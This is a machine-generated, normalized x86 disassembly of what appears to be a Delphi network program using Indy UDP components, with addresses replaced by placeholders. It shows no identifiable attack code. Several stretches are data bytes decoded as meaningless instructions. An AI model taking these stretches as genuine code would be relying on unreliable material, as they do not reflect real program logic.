call [ edi + 0xc ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebx + 0x1c ]
mov eax [ esi + 0x17c ]
call [ esi + 0x178 ]
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
lea ecx [ ebp - 0x1c ]
mov edx 0x3
mov eax [ ebx + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_408068
mov eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_404570
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx 0x3
mov eax [ ebx + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
call sub_46de88
fadd [ ebp - 0x8 ]
fstp [ ebp - 0x8 ]
fwait
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax 0x4
jle r-xdata
lea ecx [ ebp - 0xc ]
mov edx 0x4
mov eax [ ebx + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
jmp r-xdata
sub_478e07
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_478ece
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x132 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478ed5
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404188
retn
mov edx esi
mov eax ebx
call sub_47a444
test al al
jne r-xdata
mov edi [ esi + 0x1c ]
mov eax [ edi + 0x70 ]
mov [ ebp - 0x4 ] eax
push [ ebx + 0x134 ]
push [ ebx + 0x130 ]
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_47a478
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx 0x1ae
mov eax [ esi + 0x14 ]
call sub_470858
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_408350
push [ ebp - 0x10 ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0xc ]
mov edx 0x4
call sub_4044e4
mov ecx [ ebp - 0xc ]
mov edx 0xdf
mov eax [ esi + 0x14 ]
call sub_4708b0
jmp r-xdata
sub_478f1d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_479006
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_47a444
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47900d
cmp [ edi + 0x15a ] 0x0
setne bl
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470538
mov esi eax
mov ecx 0x1b8
mov edx 0x154
mov eax ebx
call sub_46e39c
mov edx eax
mov eax esi
call sub_470858
mov edx esi
mov eax [ edi + 0x9c ]
call sub_4709d8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx esi
call sub_4738a8
test bl bl
je r-xdata
mov [ ebp - 0x9 ] 0x0
lea eax [ ebp - 0x8 ]
call sub_404164
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x9 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax [ edi + 0x15c ]
call [ edi + 0x158 ]
mov ecx 0x1b9
mov edx 0xf0
mov al [ ebp - 0x9 ]
call sub_46e39c
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov ecx [ ebp - 0x8 ]
call sub_4708b0
sub_47902c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4791b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_47a444
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4791bb
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404188
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
cmp [ ebx + 0x102 ] 0x0
je r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
mov eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x74 ]
call sub_404424
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x20 ]
call sub_408250
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404684
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_404570
je r-xdata
mov edx 0x19c
mov eax [ esi + 0x14 ]
call sub_470858
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4084c8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_404164
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov eax [ ebp - 0x8 ]
call sub_404424
test eax eax
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x70 ] 0x0
jne r-xdata
mov edx 0x1ae
mov eax [ esi + 0x14 ]
call sub_470858
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x70 ] edx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_408350
push [ ebp - 0x1c ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_4044e4
mov ecx [ ebp - 0x18 ]
mov edx 0xdc
mov eax [ esi + 0x14 ]
call sub_4708b0
mov eax esi
call sub_4770b0
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x70 ]
mov [ ebp - 0xc ] eax
mov edx 0x1a4
mov eax [ esi + 0x14 ]
call sub_470858
jmp r-xdata
sub_479209
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4793d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
call sub_47a444
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4793df
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x74 ]
call sub_404424
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
call sub_404164
call sub_402a14
test eax eax
jle r-xdata
mov edx 0x19c
mov eax [ ebx + 0x14 ]
call sub_470858
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_408250
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
call sub_4041fc
push 0x1
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
mov cl 0x1
mov edx r-xdata
call sub_46e170
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_408250
mov eax [ ebp - 0x20 ]
xor edx edx
call sub_4084c8
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
mov edx [ ebx + 0x20 ]
mov eax r-xdata
call sub_404768
test eax eax
jle r-xdata
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x70 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x18 ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4044e4
inc [ ebp - 0x4 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
call sub_408250
mov eax [ ebp - 0x28 ]
xor edx edx
call sub_4084c8
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx 0xdd
mov eax [ ebx + 0x14 ]
call sub_470858
mov eax ebx
call sub_4770b0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x2c ]
xor edx edx
mov eax [ ebx + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x2c ]
mov edx [ ebx + 0x1c ]
mov eax [ esi + 0x174 ]
call [ esi + 0x170 ]
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx 0x1a4
mov eax [ ebx + 0x14 ]
call sub_470858
jmp r-xdata
sub_479403
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47954e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x16a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479555
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_404188
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov edx esi
mov eax ebx
call sub_47a444
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x74 ]
call sub_404424
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x20 ]
call sub_4041fc
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46e170
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_408250
mov eax [ ebp - 0xc ]
xor edx edx
call sub_4084c8
mov edi eax
test edi edi
jne r-xdata
mov edx 0x19c
mov eax [ esi + 0x14 ]
call sub_470858
jmp r-xdata
mov edx [ esi + 0x20 ]
mov eax r-xdata
call sub_404768
test eax eax
jle r-xdata
mov eax [ esi + 0x1c ]
mov edi [ eax + 0x70 ]
mov [ ebp - 0x8 ] edi
jmp r-xdata
mov [ ebp - 0x8 ] edi
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_408250
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_4084c8
mov [ ebp - 0x8 ] eax
jmp r-xdata
test edi edi
jne r-xdata
mov edx 0xe0
mov eax [ esi + 0x14 ]
call sub_470858
mov eax esi
call sub_4770b0
mov eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx [ esi + 0x1c ]
mov eax [ ebx + 0x16c ]
call [ ebx + 0x168 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx 0x1a4
mov eax [ esi + 0x14 ]
call sub_470858
jmp r-xdata
sub_47956b
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_479695
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_475c1c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0xf8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov esi eax
mov [ ebx + 0xfc ] esi
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ r-xdata ]
mov [ ebx + 0xa8 ] eax
mov edx 0x77
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebx + 0x7c ]
mov edx 0xc8
call sub_470858
mov [ ebx + 0xf0 ] 0x1f7
mov eax [ ebx + 0xf4 ]
mov edx 0x1f4
call sub_470858
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405fc8
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xf4 ]
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47969c
lea eax [ ebp - 0x8 ]
call sub_404164
retn
add esp 0xfffffff0
call sub_4036b4
sub_47969c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_479737
add [ ebx + 0x56 ] dl
call sub_40371c
mov ebx edx
mov esi eax
lea eax [ esi + 0xfc ]
call sub_40d490
lea eax [ esi + 0xf8 ]
call sub_40d490
mov edx ebx
and dl 0xfc
mov eax esi
call sub_475cf8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_479790
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0x14 ]
xor ebx ebx
mov [ esi ] ebx
xor ebx ebx
mov [ edi ] ebx
xor ebx ebx
mov [ ecx ] ebx
mov [ edx ] 0x0
cmp [ eax + 0x162 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
push esi
push edi
push ecx
push edx
mov ebx eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebx + 0x164 ]
call [ ebx + 0x160 ]
sub_4797e8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_47659c
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] r-xdata
mov eax [ esi + 0x30 ]
mov edx 0x1f4
call sub_470858
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] r-xdata
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] r-xdata
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] r-xdata
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] r-xdata
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov eax [ esi + 0x30 ]
mov edx 0x64
call sub_470858
mov eax [ esi + 0x34 ]
mov edx [ ebx + 0xf8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] r-xdata
mov eax [ esi + 0x30 ]
mov edx 0x19b
call sub_470858
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] r-xdata
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] r-xdata
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov eax [ ebx + 0xfc ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ esi + 0x30 ]
mov edx 0x1f7
call sub_470858
mov eax [ esi + 0x30 ]
mov edx 0xd7
call sub_470858
mov eax [ esi + 0x34 ]
mov edx [ ebx + 0xfc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov eax [ esi + 0x30 ]
mov edx 0xd7
call sub_470858
mov eax [ esi + 0x34 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] r-xdata
mov eax [ esi + 0x30 ]
mov edx 0xd7
call sub_470858
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] r-xdata
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] r-xdata
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_478b0c
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] r-xdata
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] r-xdata
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] r-xdata
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x18 ] 0x1
mov eax [ esi + 0x30 ]
mov edx 0xcd
call sub_470858
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_479014
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_47902c
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] r-xdata
mov [ esi + 0x29 ] 0x0
mov eax [ ebx + 0x74 ]
call sub_476a58
mov esi eax
lea eax [ esi + 0x10 ]
mov edx r-xdata
call sub_4041b8
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] r-xdata
mov eax [ esi + 0x30 ]
mov edx 0x1f4
call sub_470858
mov [ esi + 0x29 ] 0x0
mov ebx [ ebx + 0x9c ]
mov ecx r-xdata
mov edx 0x64
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0xc7
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0xc8
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0xc9
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0xca
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0xcd
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0xd7
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0xe7
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0xeb
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0xf0
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x14f
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x154
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x190
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x19b
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x19c
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x1a4
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x1a5
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x1a6
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x1a7
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x1ae
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x1b3
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x1b4
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x1b5
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x1b8
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x1b9
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x1c2
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x1c4
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x1f4
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x1f5
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x1f6
mov eax ebx
call sub_47090c
mov ecx r-xdata
mov edx 0x1f7
mov eax ebx
call sub_47090c
pop esi
pop ebx
retn
sub_47a444
push ebx
cmp [ eax + 0x192 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ edx + 0x1c ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov eax ebx
pop ebx
retn
mov eax [ edx + 0x14 ]
mov edx 0x1c2
call sub_470858
sub_47a478
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax esi
call sub_404164
mov eax [ ebx + 0x70 ]
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x70 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push esi
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x70 ] eax
sub_47a4d4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_474060
xor eax eax
mov [ esi + 0x70 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_47a520
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47a55c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a563
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404c00
sub_47a570
mov esp 0x47a5
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
inc edi
add [ eax ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ esi ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + eax - 0x13dc0000 ] al
inc esi
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ edi ] ah
inc edi
add [ eax - 0x3ffbe71 ] bl
adc al 0x42
add [ esi + ecx * 4 - 0x584bffbf ] dh
inc edi
add [ eax - 0x1bffbdec ] ah
adc eax 0x16dc0042
inc edx
add [ ecx + ebx ] cl
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add al ah
cmpsb [ esi ] [ edi ]
inc edi
add ah ch
out dx al
inc esi
add [ edi + ebp * 8 ] ah
inc esi
add [ edi + ebp * 8 + 0x46 ] dl
add ah dl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x47 ] dl
add [ eax - 0x59 ] dh
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x740040 ] dl
add [ eax ] al
add [ eax ] eax
out dx eax
inc esp
cmpsb [ esi ] [ edi ]
inc edi
add [ edx ] cl
push esp
dec ecx
push ebp
inc esp
push eax
inc edx
popad
jae r-xdata
inc edx
jne r-xdata
lea eax [ eax ]
xor [ esi + 0xa070047 ] ah
push esp
dec ecx
push ebp
inc esp
push eax
inc edx
popad
jae r-xdata
adc [ esi - 0x1 ] eax
inc edi
inc esi
insb
add [ eax ] ah
add [ eax ] al
jb r-xdata
test al 0x47
mov esp 0xbc0047a5
in al dx
inc esi
add [ esi ] al
add [ ecx ] cl
dec ecx
push ebp
inc esp
push eax
inc edx
popad
jae r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x72421000
imul edi [ edx + 0x65 ] r-xdata
add [ eax ] 0x0
dec [ eax + ebp * 4 ]
inc edi
mov [ esi + 0x7c ] 0xfffffffe
mov eax esi
test bl bl
je r-xdata
outsb
popad
bound ebp [ ebp + 0x64 ]
nop
xor ecx ecx
mov dl [ eax + 0x80 ]
call sub_47a838
retn
outsd
popad
arpl [ fs : ecx + 0x73 ] sp
je r-xdata
add eax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] al
add dh bh
shl [ edi + 0x10047 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
cmp al 0x10
inc eax
add [ eax + eax ] ch
[ eax + eax ]
sub_47a67e
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x20
add [ eax ] al
add al 0x0
or al [ edx + 0x75 ]
jb r-xdata
imul edi [ edx + 0x65 ] r-xdata
add [ eax ] 0x0
dec [ eax + ebp * 4 ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
